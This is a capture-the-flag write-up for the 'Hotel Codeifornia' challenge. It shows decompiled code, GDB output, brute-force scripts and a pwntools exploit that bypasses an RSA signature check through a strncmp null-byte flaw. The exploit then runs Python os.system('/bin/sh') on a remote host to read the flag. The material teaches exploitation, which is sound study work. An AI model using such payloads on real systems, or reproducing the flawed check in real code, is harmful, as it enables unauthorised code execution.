# Hotel Codeifornia

The description for this challenge is as follows:

*We need to execute some code on this machine, but it has some sort of code signing in place. See if you can have a look.*

The challenge was rated at 450 points, so it was considered one of the most difficult in the pwn/reversing category. By the end of the competition, it had 25 solves in total. To be honest, my solve for this challenge was not very difficult once the vulnerability was spotted, although I suspect that the intended solution may have been more complicated.

In terms of downloadables, you were provided with the challenge binary and a pubkey.pem RSA key file. The pubkey was not initially provided, and instead appeared a few hours into the competition.

**TL;DR Solution:** Notice that the challenge will give you a flag if the first 0x20 bytes of the SHA256 hash of your code (first input) match the corresponding bytes of your signature (second input) as encrypted by the public key, determined by the strncmp function treating both values as strings. strncmp will stop comparisons when it hits a null value, so find a match by coming up with numbers that, when encrypted, will have a null value in the second highest byte (i.e. creating a string of length 1), then find a corresponding python command that will match when hashed by appending garbage data as a comment.

## Gathering Information

As usual, we run the binary first to get a feel for what it is doing. It takes a couple of user inputs, but nothing especially interesting seems to be happening.
```
knittingirl@piglet:~/CTF/RActf$ ./hotel_codeifornia 
       Welcome to the Hotel Codeifornia
Esteemed secure code execution service since 1969

If you have a booking, please sign the guestbook below.
Enter code> aaaaaaaaaaaaaa
And just sign here please, sir> bbbbbbbbbbbbbbbb

I'm sorry, sir, but you don't appear to be on the guestbook.
```
The next step is to crack this open in Ghidra. The main function shows that this binary has a win condition that we will hit if we satisfy some condition in the verify_sig() function, which is taking both of our inputs as arguments. Our first input can be up to 0xff bytes long, and the second can be up to 0x400 bytes long; neither is long enough to create an overflow. If we are able to satisfy the win condition, the first input will be executed as python, so we will probably want to come up with some sort of simple Python script to pop a shell.
```
  undefined8 main(undefined4 param_1)

{
  int iVar1;
  size_t code_length;
  long in_FS_OFFSET;
  undefined4 local_64c;
  char my_code [256];
  char executed_by_system [303];
  char my_sig [1033];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  local_64c = param_1;
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  puts("       Welcome to the Hotel Codeifornia");
  puts("Esteemed secure code execution service since 1969\n");
  puts("If you have a booking, please sign the guestbook below.");
  printf("Enter code> ");
  fgets(my_code,0xff,stdin);
  code_length = strlen(my_code);
  my_code[code_length - 1] = '\0';
  printf("And just sign here please, sir> ");
  fgets(my_sig + 1,0x400,stdin);
  code_length = strlen(my_sig + 1);
  my_sig[code_length] = '\0';
  iVar1 = verify_sig(my_code,my_sig + 1,my_sig + 1);
  if (iVar1 == 0) {
                    /* Seems to be a win condition */
    puts("\nI\'m sorry, sir, but you don\'t appear to be on the guestbook.");
  }
  else {
    sprintf(executed_by_system,"python -c \'%s\'",my_code);
    putchar(10);
    system(executed_by_system);
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```
The verify_sig function is more interesting. Initially, I was very interested in the command to free the first argument of the function, which would be a stack variable. This would most likely produce some sort of undefined behavior, and I suspect that there may be an alternative solution leveraging this fact in some way. However, in order to execute this free, SHA256_Init, SHA256_Update, or SHA256_Final (as defined in the libcrypto library) need to return a 0, which would mean that they hit some kind of error. I was unable to figure out any input that would produce an error, so I eventually moved on.

At this point, I more closely examined the overall workings of this function and found an alternative idea. The basic idea is that it takes the SHA256 hash of my first input, then encrypts the second input with pubkey.pem (i.e. it derives n and e values, then by the RSA algorithm, the ciphertext = plaintext times e modulus n). Then strncmp checks if the first 32 bytes of these results equal, and if so, the running Python in the main function behavior occurs. Now, since strings are null terminated, strncmp will stop comparing these strings if it hits a null byte. This seems like the strategy to run with!
```
bool verify_sig(char *my_code,undefined8 my_signature)

{
  int iVar1;
  BIO_METHOD *type;
  size_t my_param_length;
  char *temp;
  long in_FS_OFFSET;
  bool bVar2;
  undefined8 uVar3;
  RSA *our_rsa_key;
  FILE *local_108;
  size_t local_100;
  char *local_f8;
  BIO *local_f0;
  undefined8 local_e8;
  char *final_result;
  undefined Also_my_sig [16];
  undefined e [16];
  undefined n [16];
  SHA256_CTX sha256_init_result;
  uchar my_hashed_code [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_108 = fopen("pubkey.pem","r");
  fseek(local_108,0,2);
  local_100 = ftell(local_108);
  rewind(local_108);
  local_f8 = (char *)malloc(local_100);
  fread(local_f8,1,local_100,local_108);
  fclose(local_108);
  type = BIO_s_mem();
  local_f0 = BIO_new(type);
  my_param_length = strlen(local_f8);
  BIO_write(local_f0,local_f8,(int)my_param_length);
  local_e8 = 0;
  our_rsa_key = RSA_new();
  PEM_read_bio_RSA_PUBKEY(local_f0,&our_rsa_key,(undefined1 *)0x0,(void *)0x0);
  BIO_free(local_f0);
  iVar1 = SHA256_Init(&sha256_init_result);
  if (iVar1 != 0) {
                    /* param_1 is my code, i.e. the first thing I input that also gets passed to
                       python for the shell popping... */
    my_param_length = strlen(my_code);
    iVar1 = SHA256_Update(&sha256_init_result,my_code,my_param_length);
    if (iVar1 != 0) {
      iVar1 = SHA256_Final(my_hashed_code,&sha256_init_result);
                    /* I think I'm going down here, which is why the stack variable isn't freeing */
      if (iVar1 != 0) {
        __gmpz_inits(Also_my_sig,e,n,0);
        __gmpz_set_str(Also_my_sig,my_signature,0x10,my_signature);
        temp = BN_bn2hex(our_rsa_key->e);
        __gmpz_set_str(e,temp,0x10,temp);
        temp = BN_bn2hex(our_rsa_key->n);
        __gmpz_set_str(n,temp,0x10,temp);
        uVar3 = 0x401394;
        __gmpz_powm(Also_my_sig,Also_my_sig,e,n);
        final_result = (char *)__gmpz_export(0,0,0,1,0,0,Also_my_sig,uVar3);
        __gmpz_clears(Also_my_sig,e,n,0);
        iVar1 = strncmp(final_result,(char *)my_hashed_code,0x20);
        bVar2 = iVar1 == 0;
        goto LAB_0040141a;
      }
    }
  }
  printf("Error verifying signature.");
                    /* Here is where we try to free a stack variabele */
  free(my_code);
  bVar2 = false;
LAB_0040141a:
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return bVar2;
}
```
In order to more fully illustrate how strncmp is working here, I've included a snippet of how GDB-GEF looks at the strncmp call when I use 'a' as my first input/code and '2' as my second input/signature. The value in rsi matches the SHA256 hash of 'a', which is ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb.
```
strncmp@plt (
   $rdi = 0x0000000002333f70 → 0xb74af9ba06d77274,
   $rsi = 0x00007ffe76d5df70 → 0xcabd1bca128197ca,
   $rdx = 0x0000000000000020,
   $rcx = 0x00007ffe76d5df70 → 0xcabd1bca128197ca
)
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "hotel_codeiforn", stopped 0x40140d in verify_sig (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40140d → verify_sig()
[#1] 0x401572 → main()
────────────────────────────────────────────────────────────────────────────────
gef➤  x/32bx 0x0000000002333f70
0x2333f70:	0x74	0x72	0xd7	0x06	0xba	0xf9	0x4a	0xb7
0x2333f78:	0xfb	0x38	0x01	0x74	0xe2	0xc2	0xdf	0x31
0x2333f80:	0xe7	0xd9	0x7f	0xf4	0x6b	0x4b	0xca	0x33
0x2333f88:	0x6f	0xae	0x2c	0x22	0x4a	0x5b	0xaf	0x0e
gef➤  x/32bx 0x00007ffe76d5df70
0x7ffe76d5df70:	0xca	0x97	0x81	0x12	0xca	0x1b	0xbd	0xca
0x7ffe76d5df78:	0xfa	0xc2	0x31	0xb3	0x9a	0x23	0xdc	0x4d
0x7ffe76d5df80:	0xa7	0x86	0xef	0xf8	0x14	0x7c	0x4e	0x72
0x7ffe76d5df88:	0xb9	0x80	0x77	0x85	0xaf	0xee	0x48	0xbb
gef➤  

```
We can derive n and e from the pubkey.pem file with this script (credit to the top answer of [this stack overflow thread](https://stackoverflow.com/questions/48025710/obtain-rsa-exponent-and-modulus-from-public-key-with-python), I copy-pasted it):
```
from Crypto.PublicKey import RSA
key_encoded='''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAjlb4vwt0v4fsmVqR4Ilu
goQNAJuE9Xckwrq3Hr723rKsdeVUBV05Hv9Q7DqGrkuohGevbD3cptFaCKiPAeLJ
ZLjm8WZ4a5zj3WCPZaStTCmAZ9MUh7ykenpJ3RrYY0x7hy7JJ5D/WqmzV7tkUjqm
8miV401PI7tKeJoZXPbfFDLBEfhjn5I3oTElq/cjvJDJlzaliJ4uqhs8XMUhcN1D
CmiGgsv/QaQ7GCMeUVSuUtU1JunTAvyEsEXFKhpVIBjzP2xkaDGqNHZ95upTM53C
SwnLRBwSQ0oky4bu3Z5GxxiLQ3Cd4jYQJoMKGySbtMZ6BAhNeg21ClkWdixBudoZ
AwIDAQAB
-----END PUBLIC KEY-----'''


pubkey = RSA.importKey(key_encoded)
print(pubkey.n)
print(pubkey.e)
```
The result is:
```
n = 17968726631679375478170381456033212274004615098868841438186702015768001928704071692300906654794175896999675061031093913538918198425839970346084146741288046906975850987978874785021068319116476054223631011519298936017406500170186227779849347178318219980694967357217295042325732673168621779705813036471834056074720926940524495374790502478631565724366566286944917328495264005297543946547156297522489432822528613588267656271353551915455938523726037237411821104210630921593325468147618924818488532399692207860502388244437060256989981481000588792444305973977346504260354233208388669942833904308477253176054126319360313792771
e = 65537
```
If we find 2 ** e % n, we get 0x7472d706baf94ab7fb380174e2c2df31e7d97ff46b4bca336fae2c224a5baf0ee744e3a6368491ca3f2a406203002fc839ecdfafea2e23139d305bdeb2376dc511cd8fbe1c180b06d62302a5962360e5aa35d00b24d52967d7d6d72a702ce10d1d65577028837559c97c5027f306005c4c160eafd1c109960d7bcd3b692e6cfb7ccca46635764328a2cea131c6faff450cad0161b2178210305c414a00d0ea241ddd5484f9e492642de813a2645a0da10bf7894474888a19f2dde3c023ecb36a50fa6b0067bfc0163fca649112442de50b4e44bccd7984fe495019d0919fd513e8867868ac6e9a4e8852d4315b7d2b94222000ce5b64ebcc4e32e62cfa82d76a. This seems to correspond with the value in rdi. In both of these cases, it is important to note that the highest value byte of the result corresponds with the first character of the 'string' that we are trying to compare.

## Writing the Exploit

So, we know that we can dramatically shrink the length of a required match by designing inputs that will compute to include null characters, which will look like shorter strings. After some trial and error, I determined that null strings will not work; you need at least one character followed by a null. The following script should get us a selection of numbers that meet this criterion between 2 and 2000 for input as the signature:
```
n = 17968726631679375478170381456033212274004615098868841438186702015768001928704071692300906654794175896999675061031093913538918198425839970346084146741288046906975850987978874785021068319116476054223631011519298936017406500170186227779849347178318219980694967357217295042325732673168621779705813036471834056074720926940524495374790502478631565724366566286944917328495264005297543946547156297522489432822528613588267656271353551915455938523726037237411821104210630921593325468147618924818488532399692207860502388244437060256989981481000588792444305973977346504260354233208388669942833904308477253176054126319360313792771
e = 65537

for i in range(2, 2000):
	result = (i ** e) % n
	final = int.to_bytes(result, 500, 'big').strip(b'\x00\x00')
	if final[1] == 0:
		print('If we input', i, 'we get', final[:2])
		valid_results.append(final[:2])
print(valid_results)
```
Which gets the result:
```
If we input 173 we get b'q\x00'
If we input 186 we get b'\x01\x00'
If we input 323 we get b'T\x00'
If we input 435 we get b"'\x00"
If we input 868 we get b'0\x00'
If we input 908 we get b'\x13\x00'
If we input 954 we get b'b\x00'
If we input 1332 we get b'(\x00'
If we input 1437 we get b'F\x00'
If we input 1599 we get b'!\x00'
If we input 1856 we get b'*\x00'
[b'q\x00', b'\x01\x00', b'T\x00', b"'\x00", b'0\x00', b'\x13\x00', b'b\x00', b'(\x00', b'F\x00', b'!\x00', b'*\x00']
```
Now we just need to find a matching hash! One potential basis of a code to input is: import os; os.system("/bin/sh"). This should be a good way to open a shell in Python, and we can add # to make a comment that will have no impact on functionality, but will let us fiddle with the hash value until we can match one of the valid first two bytes. I came up with a Python script to test appending combinations of two bytes after this base, and it quickly came up with a solution.
```
import hashlib
base = b'import os; os.system("/bin/sh")#'

n = 17968726631679375478170381456033212274004615098868841438186702015768001928704071692300906654794175896999675061031093913538918198425839970346084146741288046906975850987978874785021068319116476054223631011519298936017406500170186227779849347178318219980694967357217295042325732673168621779705813036471834056074720926940524495374790502478631565724366566286944917328495264005297543946547156297522489432822528613588267656271353551915455938523726037237411821104210630921593325468147618924818488532399692207860502388244437060256989981481000588792444305973977346504260354233208388669942833904308477253176054126319360313792771
e = 65537
valid_results = [b'q\x00', b'\x01\x00', b'T\x00', b"'\x00", b'0\x00', b'\x13\x00', b'b\x00', b'(\x00', b'F\x00', b'!\x00', b'*\x00']

i = 0
break_now = False
while i <= 0xff:
	for j in range(0xff):
		m = hashlib.sha256()
		current_test = base + int.to_bytes(i, 1, 'big') + int.to_bytes(j, 1, 'big')
		m.update(current_test)
		if m.digest()[:2] in valid_results: 
			print(current_test)
			print(m.digest())
			print('success on', i, 'and', j)
			break_now = True
			break
	if break_now == True:
		break
	i += 1
```
And the solution was:
```
knittingirl@piglet:~/CTF/RActf$ python3 hotel_codeifornia_helper.py 
b'import os; os.system("/bin/sh")#\x1f\x0c'
b"'\x00\xd4\xa2\xd1\xaeW\x96\x15\xb83!\x18\xd1\x00\x92\xbbf\x9a\xd9\xf5\xc5\x87\xab\xc9\xe2%\xfb_\xe4\x8a\xf5"
success on 31 and 12
```
So, we will be asking the strncmp function to compare the string "'". We can input 'import os; os.system("/bin/sh")#\x1f\x0c' for a code, and 435 (in hex, so 1b3) for a signature, and this should get the program to print the flag. The final payload looks like this:
```
from pwn import *

#target = process('./hotel_codeifornia')
target = remote('193.57.159.27', 34814)

#pid = gdb.attach(target, "\nb *verify_sig+775\nset disassembly-flavor intel\ncontinue")

print(target.recvuntil(b'Enter code>'))

target.sendline(b'import os; os.system("/bin/sh")#\x1f\x0c')

print(target.recvuntil(b'please, sir>'))

target.sendline(hex(435)[2:].encode('ascii'))

target.interactive()
```
And the result looks like this:
```
knittingirl@piglet:~/CTF/RActf$ python3 hotel_codeifornia_payload.py 
[+] Opening connection to 193.57.159.27 on port 34814: Done
b'       Welcome to the Hotel Codeifornia\nEsteemed secure code execution service since 1969\n\nIf you have a booking, please sign the guestbook below.\nEnter code>'
b' And just sign here please, sir>'
[*] Switching to interactive mode
 
$ ls
flag.txt
main
pubkey.pem
$ cat flag.txt
ractf{W3lComE_t0_Th3_LA_B3d_n_br3Akfast}
$ 

```
Thanks for reading!
